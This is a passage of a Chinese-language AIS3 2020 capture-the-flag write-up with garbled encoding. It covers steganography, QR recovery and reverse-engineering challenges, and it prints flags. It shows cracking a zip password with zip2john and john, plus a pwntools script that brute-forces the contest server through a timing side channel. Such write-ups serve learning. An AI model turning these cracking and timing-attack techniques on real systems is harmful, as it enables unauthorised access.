class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="o">-</span><span class="mi">59</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">62</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">66</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">71</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">92</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">70</span><span class="p">]</span>
    <span class="n">notes</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">notes</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">notes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">notes</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">notes</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">notes</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">constraints</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,[</span><span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">notes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">notes</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">secret</span><span class="p">))]))</span>
        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">#dis.dis(run)
</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<p>æˆ‘å¾Œä¾†åˆå¡äº†å¥½å¹¾å€‹å°æ™‚ï¼›æˆ‘ç¬¬ä¸€æ¬¡æ²’æœ‰çœ‹å‡ºä¾†é€™æ˜¯ Fibonacci æ•¸åˆ—ã€‚é‚è¼¯æœ‰æ™‚å€™é —çˆ›ç„¶å¾Œå°æ•¸å­—æ²’ä»€éº¼æ„Ÿè¦ºã€‚ç¸½ä¹‹ï¼Œæœ€å¾Œæ˜¯æœ‰è³‡ç§‘ç³»åŒå­¸å‰›å¥½åœ¨æˆ‘èº«æ—çœ‹åˆ°æ¨äº†æˆ‘ä¸€æŠŠæ‰çœ‹æ‡‚ã€‚æœ€å¾Œæ¨å‡ºä¾†æ‰€æœ‰çš„æŒ‰éµæ‡‰è©²æ˜¯ <code class="language-plaintext highlighter-rouge">lloolloolloo[;lolloolloolloo[;lolloolloolloo[;lolloojjhhjjhh lloolloolloo[;lolloolloolloojol;[[lloollhhhh-hjol;[[lloollgg</code>. æœ€å¾Œæ’­å®Œå™´ Flagã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/38IF3XJ.png" alt="" /></p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan}</code></p>

<h2 id="misc">Misc</h2>

<h3 id="-piquero-100-pt">ğŸ’¤ Piquero (100 pt.)</h3>

<p><img src="/assets/images/posts/ais3-2020-writeup/2dA2K5Q.jpg" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/jQHwDD4.jpg" alt="" /></p>

<!-- æˆ‘ä¸€é–‹å§‹çœ‹åˆ°é€™é¡Œçš„æ™‚å€™å…§å¿ƒè¦ºå¾—ä¸»è¾¦åœ¨ææˆ‘å€‘ã€‚!-->

<p>é€™é¡Œå°±å¾ˆç„¡è…¦çš„ç…§è‘—é»å­—é€éåƒæ˜¯ decode.fr æ…¢æ…¢è§£ã€‚æ²’æœ‰ç•™ Flagã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/GV8ZvhF.png" alt="" /></p>

<h3 id="-karuego-100-pt">ğŸ¥ Karuego (100 pt.)</h3>

<p>é€™ç¨®åªæœ‰åœ–ç‰‡çš„é¡Œç›®ä¸å¤–ä¹æ˜¯è—åœ¨ EXIF ä¸ç„¶å°±æ˜¯è—åœ¨é€™å¼µç…§ç‰‡çš„æŸå€‹å€æ®µï¼Œæ‰€ä»¥æˆ‘å€‘å…ˆç”¨ <code class="language-plaintext highlighter-rouge">binwalk</code> æª¢æŸ¥ã€‚</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ binwalk Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             PNG image, 2880 x 1492, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files/
2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg
2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files/Demon.png
3260899       0x31C1E3        End of Zip archive, footer length: 22
</code></pre></div></div>

<p>çœ‹èµ·ä¾†çš„ç¢ºæ˜¯æœ‰è—æ±è¥¿ï¼Œæˆ‘å€‘ç”¨ <code class="language-plaintext highlighter-rouge">-e</code> æ‹‰å‡ºä¾†çœ‹çœ‹å§ï¼Œæœ€å¾Œæˆ‘å€‘ç™¼ç¾è£¡é¢æœ‰ä¸€å€‹ZIPæª”ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/0y8L2ah.png" alt="" /></p>

<p>å¾ˆå¯æƒœçš„ï¼Œæ²’é‚£éº¼ç°¡å–®ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/DVuodd0.png" alt="" /></p>

<p>é€™æ™‚å€™å°±å¾—æ¬å‡º John the Ripper å›‰ï¼John the Ripperä¸­çš„ <code class="language-plaintext highlighter-rouge">zip2john</code> å¯ä»¥å¹«åŠ©æˆ‘å€‘æ’ˆå‡ºé€™å€‹ ZIP file çš„æ‰€æœ‰ Hashï¼Œæ¥è‘—å°±å¯ä»¥é€é <code class="language-plaintext highlighter-rouge">john</code> ä¾†é€²è¡Œ dictionary attackã€‚</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ zip2john.exe .<span class="se">\1</span>F6D30.zip <span class="o">&gt;</span> out.hash
</code></pre></div></div>

<p><img src="/assets/images/posts/ais3-2020-writeup/fBUnrle.jpg" alt="" /></p>

<p>æˆ‘å€‘æ’ˆå‡º Hash ä¹‹å¾Œå°±å¯ä»¥å¡çµ¦ <code class="language-plaintext highlighter-rouge">john</code> å¹«æˆ‘å€‘åšäº‹äº†ï¼</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ john.exe out.hash
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 24 OpenMP threads
Proceeding with single, rules:Single
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
Warning: Only 4 candidates buffered <span class="k">for </span>the current salt, minimum 24 needed <span class="k">for </span>performance.
Proceeding with wordlist:/run/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
lafire           <span class="o">(</span>1F6D30.zip<span class="o">)</span>
1g 0:00:00:14 DONE 3/3 <span class="o">(</span>2020-06-20 01:48<span class="o">)</span> 0.06757g/s 6074Kp/s 6074Kc/s 6074KC/s 2tzbr1..lirono
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<p>å‡ºä¾†ä¹‹å¾Œæˆ‘å€‘å°±çŸ¥é“é€™å€‹ zip çš„å¯†ç¢¼æ˜¯ <code class="language-plaintext highlighter-rouge">lafire</code>ï¼Œé€™æ™‚å°±å¯ä»¥å»é–‹ Flag äº†ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/Y2lzuXE.png" alt="" /></p>

<h3 id="-soy-139-pt">ğŸŒ± Soy (139 pt.)</h3>

<p><img src="/assets/images/posts/ais3-2020-writeup/yCCp9U3.png" alt="" /></p>

<p>é€™é¡Œæ˜¯ QR Code recoveryï¼Œæœ€è¿‘<a href="https://hsctf.com/">å¤§å®¶ä¼¼ä¹éƒ½å¾ˆå–œæ­¡è€ƒé€™é¡Œ</a>ã€‚å¾ˆå¯æƒœçš„ï¼ŒQRazyBox ä¸æ˜¯å¾ˆå–œæ­¡é€™ç¨®è¢«è“‹æ‰é‡è¦éƒ¨ä»½çš„ QR Codeã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/ODAaW8P.png" alt="" /></p>

<p>é€™æ™‚å€™å°±å¾—äººå·¥ä»‹å…¥äº†ï¼Œæˆ‘å€‘ä¾éƒ¨ä»½é»‘é»å¯ä»¥éš±ç´„çœ‹å‡ºå“ªéƒ¨åˆ†æœ‰å¯èƒ½æ˜¯é»‘çš„æˆ–ç™½çš„ã€‚æˆ‘å€‘å¯ä»¥é€é Brightness &amp; Contrast èª¿æ•´å¹«åŠ© QRazyBox è¾¨è­˜ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/FwLVG94.png" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/VTM1LQX.png" alt="" /></p>

<p>æ¥è‘—æˆ‘å€‘åœ¨äººå·¥æŠŠ Position éƒ¨åˆ†è·Ÿ Finder åŠ å›å»ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/rWkRJAw.png" alt="" /></p>

<p>é€™æ™‚å€™ä¸Ÿé€² QRazyBox å°±å¥½äº†ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/gEJgFlK.png" alt="" /></p>

<p>æ¥è‘—æˆ‘å€‘å¯ä»¥å¼·åˆ¶è¦æ±‚ QRazyBox æŠŠè®€å¾—å‡ºä¾†çš„æ±è¥¿æ‹‰å‡ºä¾†ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/4WdIisY.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QR version : 2 (25x25)
Error correction level : L
Mask pattern : 0
Number of missing bytes (erasures) : 0 bytes (0.00%)
Data blocks :
["01000010","00000100","00010100","10010101","00110011","00110111","10110100","10000011","00000111","01110101","11110110","00110011","01000110","11100101","11110111","10010011","00000111","01010101","11110110","01100011","00010110","11100110","01000101","11110110","11010110","01010011","11110010","00010011","11110010","00010011","11110010","00010010","00010110","11010000","00101111","11010001","11110100","11011010","10001110","10110011","11010101","00100100","11011101","00110011"]
Final data bits :
01000010000001000001010010010101001100110011011110110100100000110000011101110101111101100011001101000110111001011111011110010011000001110101010111110110011000110001011011100110010001011111011011010110010100111111001000010011111100100001001111110010000100100001011011010000
[0100] [00100000] [0100000101001001001010010100110010011001101101111011010010010000010011000001101110111010010111110110110001100100110100011011011100100101111101101111001001001100000110111010101001011111011011001100010011000101101101110011011001000100101111101101101101011011001010010011111100100100001001001111110010010000100100111111001001000010010010000101101101101000]
Mode Indicator : 8-bit Mode (0100)
Character Count Indicator : 32
Decoded data : AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!m
Final Decoded string : AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!m
</code></pre></div></div>

<p>é€™æ™‚æˆ‘å€‘å°±å¯ä»¥çŒœå‡ºFlagäº†ã€‚</p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}</code></p>

<h3 id="-saburo-359-pt">ğŸ‘‘ Saburo (359 pt.)</h3>

<p>é€™é¡Œç´”ç²¹ç”¨ pwntools ä¸€ç›´æš´åŠ›æˆ³å°æ–¹ä¼ºæœå™¨ï¼Œé–‹äº†ä¸€å † Pool ç‹‚æˆ³ã€‚</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span>
<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Pool</span><span class="p">,</span> <span class="n">Array</span><span class="p">,</span> <span class="n">Manager</span>
<span class="kn">from</span> <span class="nn">traceback</span> <span class="kn">import</span> <span class="n">print_exception</span>

<span class="k">def</span> <span class="nf">handle_error</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="n">print_exception</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_range</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
    <span class="n">Min</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="s">"inf"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"60.250.197.227"</span><span class="p">,</span> <span class="mi">11001</span><span class="p">)</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
            <span class="n">rep</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
            <span class="k">if</span> <span class="s">"lose"</span> <span class="ow">in</span> <span class="n">rep</span><span class="p">:</span>
                <span class="n">sec</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">rep</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">5</span><span class="p">])</span>
                <span class="n">Min</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">Min</span><span class="p">,</span> <span class="n">sec</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">cur_min</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">Min</span>

<span class="n">doc</span> <span class="o">=</span> <span class="s">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?_{}"</span>
<span class="n">ans</span> <span class="o">=</span> <span class="s">"AIS3{A1r1ght_U_4r3_my_3n3"</span>
<span class="n">cur_min</span> <span class="o">=</span> <span class="n">Manager</span><span class="p">().</span><span class="nb">list</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)))))</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">Pool</span><span class="p">(</span><span class="n">processes</span><span class="o">=</span><span class="mi">16</span><span class="p">,</span> <span class="n">maxtasksperchild</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">apply_async</span><span class="p">(</span><span class="n">get_range</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ans</span><span class="o">+</span><span class="n">doc</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span><span class="p">),</span> <span class="n">error_callback</span><span class="o">=</span><span class="n">handle_error</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
    <span class="n">cur_min</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">cur_min</span><span class="p">)</span>
    <span class="n">ans</span> <span class="o">+=</span> <span class="n">doc</span><span class="p">[</span><span class="n">cur_min</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">cur_min</span><span class="p">))]</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n\n</span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./Saburo_ans2"</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    
